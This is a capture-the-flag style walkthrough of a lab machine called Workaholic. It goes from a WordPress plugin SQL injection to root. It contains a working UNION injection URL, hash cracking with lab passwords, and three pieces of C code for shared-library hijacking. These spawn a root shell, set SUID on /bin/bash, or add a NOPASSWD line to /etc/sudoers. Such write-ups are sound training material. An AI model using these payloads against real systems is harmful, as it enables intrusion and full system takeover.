# Workaholic

## Initial access

Ran `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.229
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.5)
- **22** — SSH (OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP (nginx 1.24.0 (Ubuntu))
  - The site redirects to `http://workaholic.offsec`
    - Added `workaholic.offsec` to the `/etc/hosts` file:

    ```
    192.168.239.229 workaholic.offsec
    ```

Browsed to `http://workaholic.offsec`. It is a WordPress site.

Enumerated WordPress users and attempted to crack their passwords:

```
wpscan --url http://workaholic.offsec/ -e u -P /usr/share/wordlists/rockyou.txt
```

- WordPress version 6.7.2
- Identified 3 users: `admin`, `charlie` and `ted`, but did not manage to crack their passwords

Enumerated WordPress plugins:

```
wpscan --url http://workaholic.offsec/ -e ap --plugins-detection aggressive --force
[+] wp-advanced-search
 | Location: http://workaholic.offsec/wp-content/plugins/wp-advanced-search/
 | Last Updated: 2025-09-10 9:36am GMT (1 year ago)
 | Readme: http://workaholic.offsec/wp-content/plugins/wp-advanced-search/readme.txt
 | [!] The version is out of date, the latest version is 3.3.9.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://workaholic.offsec/wp-content/plugins/wp-advanced-search/, status: 403
 |
 | Version: 3.3.8 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://workaholic.offsec/wp-content/plugins/wp-advanced-search/readme.txt
```

Searched online for `wp-advanced-search` vulnerabilities:

```
**Unauthenticated SQL Injection — CVE-2024-9796** (affects versions `<= 3.3.9` / `< 3.3.9.2`)

- **Impact:** Unauthenticated attackers can inject SQL via the autocompletion endpoint (`class.inc/autocompletion/autocompletion-PHP5.5.php`) due to insufficient sanitization/escaping of user input, potentially extracting sensitive database data.
- **Severity:** High (CVSS 7.5–8.6).
```

- PoC found here: https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/

Exploited the SQL injection by sending a UNION-based payload to the autocompletion endpoint (following the PoC): http://workaholic.offsec/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20UNION%20SELECT%20user_pass%20FROM%20wp_users--&f=user_login&type=&e=

```
admin charlie ted $P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn. $P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p. $P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
```

- Found credentials:
  - `admin:$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.`
  - `charlie:$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.`
  - `ted:$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/`

Used `hashcat` to identify and crack the password hashes:

```
hashcat --identify hash.txt
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    400 | phpass                                                     | Generic KDF

hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
...
$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/:okadamat17
$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.:chrish20
```

- Cracked 2 possible passwords: `okadamat17` and `chrish20`

Tried to log in to `admin`, `charlie` and `ted` through SSH using both possible passwords. All failed.

Tried to log in to `admin`, `charlie` and `ted` through FTP using both possible passwords:

```
ftp ted@192.168.239.229
331 Please specify the password.
Password: okadamat17
230 Login successful.
```

- Successfully logged in with `ted:okadamat17`

Explored the FTP directory. A normal directory listing failed, so switched to passive mode:

```
ftp> passive
Passive mode: off; fallback to active mode: off.

ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          405 Mar 27  2025 index.php
-rwxr-xr-x    1 1002     1002        19915 Mar 27  2025 license.txt
-rwxr-xr-x    1 1002     1002         7409 Mar 27  2025 readme.html
-rwxr-xr-x    1 1002     1002         7387 Mar 27  2025 wp-activate.php
drwxr-xr-x    9 1002     1002         4096 Mar 27  2025 wp-admin
-rwxr-xr-x    1 1002     1002          351 Mar 27  2025 wp-blog-header.php
-rwxr-xr-x    1 1002     1002         2323 Mar 27  2025 wp-comments-post.php
-rwxr-xr-x    1 1002     1002         3336 Mar 27  2025 wp-config-sample.php
-rwxr-xr-x    1 1002     1002         3178 Mar 27  2025 wp-config.php
drwxr-xr-x    5 1002     1002         4096 Mar 27  2025 wp-content
-rwxr-xr-x    1 1002     1002         5617 Mar 27  2025 wp-cron.php
drwxr-xr-x   30 1002     1002        12288 Mar 27  2025 wp-includes
-rwxr-xr-x    1 1002     1002         2502 Mar 27  2025 wp-links-opml.php
-rwxr-xr-x    1 1002     1002         3937 Mar 27  2025 wp-load.php
-rwxr-xr-x    1 1002     1002        51367 Mar 27  2025 wp-login.php
-rwxr-xr-x    1 1002     1002         8543 Mar 27  2025 wp-mail.php
-rwxr-xr-x    1 1002     1002        29032 Mar 27  2025 wp-settings.php
-rwxr-xr-x    1 1002     1002        34385 Mar 27  2025 wp-signup.php
-rwxr-xr-x    1 1002     1002         5102 Mar 27  2025 wp-trackback.php
-rwxr-xr-x    1 1002     1002         3246 Mar 27  2025 xmlrpc.php

ftp> get wp-config.php
```

- `wp-config.php` is the most interesting file since it contains database credentials and other sensitive configuration details.

Read `wp-config.php`:

```
cat wp-config.php
/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );
```

- New possible password: `rU)tJnTw5*ShDt4nOx`

Tried to log in to `admin`, `charlie` and `ted` through SSH using the new password:

```
ssh charlie@192.168.239.229
charlie@192.168.239.229's password: rU)tJnTw5*ShDt4nOx

$ whoami
charlie
```

- Successfully logged in with `charlie:rU)tJnTw5*ShDt4nOx`
- Shell was unstable for some reason and was stabilised manually.

Retrieved the `local.txt` flag:

```
charlie@workaholic:~$ cat local.txt
9646a547991319d9c673739df9d679bf
```

## Privilege escalation

Uploaded `linpeas.sh` to the target:

```
scp linux/enum/linpeas.sh charlie@192.168.239.229:/tmp
charlie@192.168.239.229's password: rU)tJnTw5*ShDt4nOx
```

Ran `linpeas.sh` to enumerate privilege escalation vectors:

```
charlie@workaholic:~$ cd /tmp
charlie@workaholic:/tmp$ ./linpeas.sh
```

Important findings:

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
...
-rwsr-xr-x 1 root root 17K Mar 27  2025 /var/www/html/wordpress/blog/wp-monitor (Unknown SUID binary!)
```

Investigated `/var/www/html/wordpress/blog/wp-monitor`:

```
strings /var/www/html/wordpress/blog/wp-monitor
...
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
```

- The binary loads a native library (`/home/ted/.lib/libsecurity.so`) and calls an `init_plugin` function.

Checked whether we can write to `/home/ted/`:

```
charlie@workaholic:/tmp$ ls -al /home/ted/
total 24
drwxrwxrwx 3 ted  ted  4096 Mar 27  2025 .
drwxr-xr-x 5 root root 4096 Mar 27  2025 ..
lrwxrwxrwx 1 root root    9 Mar 27  2025 .bash_history -> /dev/null
-rw-r--r-- 1 ted  ted   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ted  ted  3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 ted  ted   807 Mar 31  2024 .profile
drwxr-xr-x 5 ted  ted  4096 Mar 27  2025 shared
```

- `/home/ted/` is world-writable (`drwxrwxrwx`). The `.lib/` directory does not yet exist.

Crafted a `libsecurity.c` that spawns a `bash` shell via the `init_plugin` function:

```
code libsecurity.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int init_plugin() {
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork failed");
        return 1;
    } else if (pid == 0) {
        // Child process: replace with bash
        execl("/bin/bash", "bash", (char *)NULL);
        perror("execl failed"); // Only reached if execl fails
        exit(1);
    } else {
        // Parent process: wait for bash to close
        int status;
        waitpid(pid, &status, 0);
    }
    return 0;
}
```

Compiled `libsecurity.c` as a shared native library:

```
gcc -fPIC -shared -o libsecurity.so libsecurity.c
```

Created the `/home/ted/.lib/` directory on the target and uploaded `libsecurity.so`:

```
# Target
charlie@workaholic:/tmp$ mkdir /home/ted/.lib/

# Host
scp libsecurity.so charlie@192.168.239.229:/home/ted/.lib/
charlie@192.168.239.229's password: rU)tJnTw5*ShDt4nOx
```

Ran `/var/www/html/wordpress/blog/wp-monitor` to trigger the shared library load as root:

```
charlie@workaholic:/tmp$ /var/www/html/wordpress/blog/wp-monitor
[+] Checking the logs...
root@workaholic:/tmp# whoami
root
```

Retrieved the `proof.txt` flag:

```
root@workaholic:/tmp# cd /root
root@workaholic:/root# cat proof.txt
b2e3d47c9656bcf35a20a244ab1b160d
```

### Alternative Privilege Escalation — SUID bash via shared library injection

The same SUID binary `/var/www/html/wordpress/blog/wp-monitor` loads `/home/ted/.lib/libsecurity.so` via `dlopen`/`dlsym`. Instead of spawning a direct shell, the `init_plugin` function can be crafted to set the SUID bit on `/bin/bash`:

```c
#include <unistd.h>
#include <stdlib.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("chmod +s /bin/bash");
}
```

After running the SUID binary, `/bin/bash` gains the SUID bit. A root shell is then obtained by invoking it with the `-p` flag:

```
/bin/bash -p
root@workaholic:~# whoami
root
```

Credit: [Preethudoss — Proving Grounds Practice: Workaholic](https://medium.com/@preethudoss/proving-grounds-practice-workaholic-1db18abe3ac0)

### Alternative Privilege Escalation — sudoers modification via shared library injection

The same shared library hijack can be used to modify `/etc/sudoers` instead of spawning a shell directly. The `init_plugin` function adds a NOPASSWD sudo rule for the `charlie` user:

```c
#include <stdio.h>
#include <stdlib.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("echo 'charlie ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers");
}
```

Compile and plant the library as before. After running the SUID binary, grant full passwordless sudo access to `charlie`:

```
sudo su
root@workaholic:/home/ted/.lib# whoami
root
```

Credit: [edbert sumicad — PG Workaholic: Privilege Escalation via Misconfigured Plugin Loader](https://edbertsumicad.medium.com/pg-workaholic-privilege-escalation-via-misconfigured-plugin-loader-assume-breach-355a869b2efd)
